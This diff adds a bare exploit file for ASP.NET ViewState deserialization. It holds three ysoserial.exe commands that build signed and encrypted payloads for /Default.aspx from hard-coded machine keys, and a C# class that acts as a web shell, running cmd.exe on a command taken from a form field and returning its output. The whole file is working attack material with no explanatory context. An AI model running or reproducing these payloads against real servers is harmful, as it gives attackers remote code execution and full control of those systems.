@@ -1,0 +1,30 @@
+.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc" --path="/Default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="B03AF684150CA74C7FD2912DCE1A2B0851827A4762EE6F71" --validationalg="SHA1" --validationkey="E4361AC92617422FDE1394014B9747BC91CD17FAC7D03EAF0D52287EE47AD52679A91E0BEBA7058F52FD0BC69CBF699A91ED9D815A9842EC43CA12A6CDFB2A37" --showraw
+
+.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll" --path="/Default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="B03AF684150CA74C7FD2912DCE1A2B0851827A4762EE6F71" --validationalg="SHA1" --validationkey="E4361AC92617422FDE1394014B9747BC91CD17FAC7D03EAF0D52287EE47AD52679A91E0BEBA7058F52FD0BC69CBF699A91ED9D815A9842EC43CA12A6CDFB2A37" --showraw
+
+.\ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c "ignore" --path="/Default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="B03AF684150CA74C7FD2912DCE1A2B0851827A4762EE6F71" --validationalg="SHA1" --validationkey="E4361AC92617422FDE1394014B9747BC91CD17FAC7D03EAF0D52287EE47AD52679A91E0BEBA7058F52FD0BC69CBF699A91ED9D815A9842EC43CA12A6CDFB2A37" --showraw
+
+class E
+{
+    public E()
+    {
+        System.Web.HttpContext context = System.Web.HttpContext.Current;
+        context.Server.ClearError();
+        context.Response.Clear();
+        try
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            process.StartInfo.FileName = "cmd.exe";
+            string cmd = context.Request.Form["cmd"];
+            process.StartInfo.Arguments = "/c " + cmd;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = true;
+            process.StartInfo.UseShellExecute = false;
+            process.Start();
+            string output = process.StandardOutput.ReadToEnd();
+            context.Response.Write(output);
+        } catch (System.Exception) {}
+        context.Response.Flush();
+        context.Response.End();
+    }
+}
